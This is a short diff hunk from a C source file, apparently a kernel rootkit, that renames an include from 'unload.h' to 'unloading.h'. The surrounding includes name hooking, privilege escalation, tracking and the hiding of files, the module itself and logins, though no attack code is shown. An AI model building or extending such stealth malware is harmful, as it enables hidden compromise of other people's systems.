@@ -15,7 +15,7 @@
 #include "hooking/func.h"
 #include "capabilities/privilege.h"
 #include "capabilities/tracking.h"
-#include "capabilities/unload.h"
+#include "capabilities/unloading.h"
 #include "capabilities/hiding/dentry.h"
 #include "capabilities/hiding/module.h"
 #include "capabilities/hiding/login.h"
